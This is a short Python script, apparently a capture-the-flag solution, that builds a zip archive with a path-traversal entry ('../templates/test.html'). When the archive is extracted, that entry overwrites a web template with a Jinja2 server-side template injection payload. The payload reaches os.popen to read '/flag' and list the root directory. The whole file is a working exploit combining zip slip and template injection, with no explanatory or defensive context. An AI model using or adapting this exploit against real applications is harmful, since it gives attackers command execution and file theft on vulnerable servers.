import zipfile
import io

def create_exploit():
    ssti_payload = """
    <!DOCTYPE html>
    <html>
    <head><title>Pwned</title></head>
    <body>
    <h1>Flag Output:</h1>
    <pre>
    {{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
    </pre>
    <hr>
    <h3>Root Directory Listing:</h3>
    <pre>
    {{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}
    </pre>
    </body>
    </html>
    """
    target_path = "../templates/test.html"

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(target_path, ssti_payload)

    filename = "turtle_exploit.zip"
    with open(filename, "wb") as f:
        f.write(zip_buffer.getvalue())
        
    print(f"Generated '{filename}'")

if __name__ == "__main__":
    create_exploit()